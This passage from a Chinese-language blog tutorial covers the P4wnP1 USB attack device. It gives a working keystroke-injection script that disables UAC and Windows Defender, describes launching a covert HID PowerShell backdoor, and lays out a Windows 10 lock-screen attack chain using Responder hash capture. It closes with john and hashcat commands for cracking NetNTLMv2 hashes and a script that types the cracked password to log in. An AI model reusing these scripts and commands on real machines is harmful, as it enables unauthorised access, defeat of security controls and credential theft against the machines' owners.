<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALT-SHIFT</span><br></pre></td></tr></table></figure>


<ol start="3">
<li>关闭windows defender：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">DELAY 2000</span><br><span class="line">REM first disable UAC</span><br><span class="line">CONTROL ESCAPE</span><br><span class="line">DELAY 200</span><br><span class="line">STRING uac</span><br><span class="line">DELAY 200</span><br><span class="line">ENTER</span><br><span class="line">DELAY 200</span><br><span class="line">DOWNARROW</span><br><span class="line">DELAY 200</span><br><span class="line">DOWNARROW</span><br><span class="line">DELAY 200</span><br><span class="line">DOWNARROW</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">ENTER</span><br><span class="line">DELAY 200</span><br><span class="line">LEFT</span><br><span class="line">DELAY 200</span><br><span class="line">ENTER</span><br><span class="line">DELAY 200</span><br><span class="line">REM it&#x27;s time to disable the fuckin&#x27; defender....</span><br><span class="line">CONTROL ESCAPE</span><br><span class="line">DELAY 200</span><br><span class="line">STRING virus pro</span><br><span class="line">DELAY 200</span><br><span class="line">ENTER</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">ENTER</span><br><span class="line">DELAY 200</span><br><span class="line">SPACE</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">SPACE</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">SPACE</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">DELAY 2000</span><br><span class="line">REM first enable the fuckin&#x27; defender....</span><br><span class="line">CONTROL ESCAPE</span><br><span class="line">DELAY 200</span><br><span class="line">STRING virus pro</span><br><span class="line">DELAY 200</span><br><span class="line">ENTER</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">ENTER</span><br><span class="line">DELAY 200</span><br><span class="line">SPACE</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">SPACE</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">SPACE</span><br><span class="line">DELAY 200</span><br><span class="line">REM alt f4 close the window</span><br><span class="line">ALT F4</span><br><span class="line">REM it&#x27;s time to enable UAC</span><br><span class="line">CONTROL ESCAPE</span><br><span class="line">DELAY 200</span><br><span class="line">STRING uac</span><br><span class="line">DELAY 200</span><br><span class="line">ENTER</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">UPARROW</span><br><span class="line">DELAY 200</span><br><span class="line">UPARROW</span><br><span class="line">DELAY 200</span><br><span class="line">TAB</span><br><span class="line">DELAY 200</span><br><span class="line">ENTER</span><br></pre></td></tr></table></figure>

<h3 id="MouseScript脚本"><a href="#MouseScript脚本" class="headerlink" title="MouseScript脚本"></a>MouseScript脚本</h3><p>除了发送键盘脚本之外还 可以用脚本模拟鼠标移动点击。<br>使用<code>SendMouseScript</code>命令，即可运行.&#x2F;P4wnP1&#x2F;MouseScript目录下的脚本。<br>脚本语法说明见下：<br><a target="_blank" rel="noopener" href="https://p4wnp1.readthedocs.io/en/latest/OS-independent-features-Subfolder/OS-independent-features-Home/">https://p4wnp1.readthedocs.io/en/latest/OS-independent-features-Subfolder/OS-independent-features-Home/</a></p>
<h3 id="隐蔽通道HID后门建立"><a href="#隐蔽通道HID后门建立" class="headerlink" title="隐蔽通道HID后门建立"></a>隐蔽通道HID后门建立</h3><p>输入命令<code>FireStage1</code>即可通过PowerShell启动一个隐蔽通道的shell后门：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/powershell.PNG" alt="powershell"></p>
<p>输入<code>shell</code>命令，可启动一个cmd命令行：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/shell.PNG" alt="shell"></p>
<h2 id="破解win10登录密码并自动登录"><a href="#破解win10登录密码并自动登录" class="headerlink" title="破解win10登录密码并自动登录"></a>破解win10登录密码并自动登录</h2><p>针对win10 v1709及之前的版本可以使用P4wnP1破解登录密码。<br>选择Win10_LockPicker.txt的payload，根据目标机的输入法语言更改 Win10_LockPicker.txt中的lang设置。</p>
<p><strong>攻击链</strong></p>
<ol>
<li>USB网口启动DHCP，配置目标机</li>
<li>将整个IPv4地址空间的静态路由部署到目标机</li>
<li>将远程主机的流量重定向到自身</li>
<li>使用Responder.py提取来自目标机的各种协议请求，并强制进行身份验证并尝试截取用于验证的哈希</li>
<li>接入目标机后如果led灯按顺序闪烁3次，说明它已经抓取到了一个哈希，可以在&#x2F;home&#x2F;pi&#x2F;P4wnP1&#x2F;collect文件夹下找到它抓取的哈希，并可以手动进行离线破解</li>
<li>或者继续交给P4wnP1，它会把哈希值传给John the Ripper（&#x2F;home&#x2F;pi&#x2F;P4wnP1&#x2F;john）来破解哈希密码</li>
<li>如果成功破解了密码P4wnP1就能模拟键盘输入密码进入系统</li>
</ol>
<h3 id="手动破解hash并进入系统"><a href="#手动破解hash并进入系统" class="headerlink" title="手动破解hash并进入系统"></a>手动破解hash并进入系统</h3><p><strong>john the ripper</strong><br><a target="_blank" rel="noopener" href="https://www.openwall.com/john/">https://www.openwall.com/john/</a><br>e.g.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john -w:password.lst pass.txt</span><br></pre></td></tr></table></figure>

<p>password.lst为密码字典，pass.txt为需要破解的hash文件</p>
<p>生成更完整的字典：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --stdout --wordlist=password.lst --rules &gt; password2.lst</span><br></pre></td></tr></table></figure>

<p>john生成的规则可以在john.conf中定义。</p>
<p><strong>hashcat</strong><br>下载最新版的<a target="_blank" rel="noopener" href="https://hashcat.net/hashcat/">hashcat</a></p>
<p>hashcat内置字符集：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153359902.png" alt="image-20220919153359902"></p>
<p>将抓取的哈希保存到txt中，进入cmd中运行:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 5600 hash1.txt -a 3 -1 ?l?d ?1?1?1?1?1</span><br></pre></td></tr></table></figure>

<p>可以看到跑出来了用户密码：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153411527.png" alt="image-20220919153411527"></p>
<p>之后可以更改为hid_backdoor.txt进入P4wnP1 shell来发送密码进入系统，或者使用下面这个橡皮鸭脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ENTER</span><br><span class="line">DELAY 200</span><br><span class="line">STRING 23333</span><br><span class="line">DELAY 200</span><br><span class="line">ENTER</span><br></pre></td></tr></table></figure>


        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/project/2023/08/09/%E5%9F%BA%E4%BA%8EUEFI%E5%B9%B3%E5%8F%B0%E7%9A%84SMM%E5%90%8E%E9%97%A8%E6%9E%84%E5%BB%BA/"
      title="基于UEFI平台的SMM后门构建"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        基于UEFI平台的SMM后门构建
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/project/2023/08/09/VBIOS%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BF%AE%E6%94%B9%E6%96%B9%E5%BC%8F/"
      title="VBIOS原理及修改方式"
     >

    <p class="title-text">
      
        VBIOS原理及修改方式
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>


  
  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
  <div id="comment-card" class="comment-card">
    <div class="main-title-bar">
      <div class="main-title-dot"></div>
      <div class="main-title">留言 </div>
    </div>
    <div id="vcomments"></div>
  </div>
  <script>
      new Valine({"enable":true,"appId":"bC8HOSKa4QB7G6TfuGWB97i4-gzGzoHsz","appKey":"aoDFuSX5vWN8Xn1ukZpJ50be","placeholder":"写下你的评论...","pageSize":10,"highlight":true,"serverURLs":null,"el":"#vcomments"});
  </script>
 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2023 Edvison<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
        <span class="material-symbols-rounded">keyboard_arrow_up</span>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.style.opacity = 1;
        } else {
            btn.style.opacity = 0;
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/project/js/light-dark-switch.js"></script>
</body>
</html>
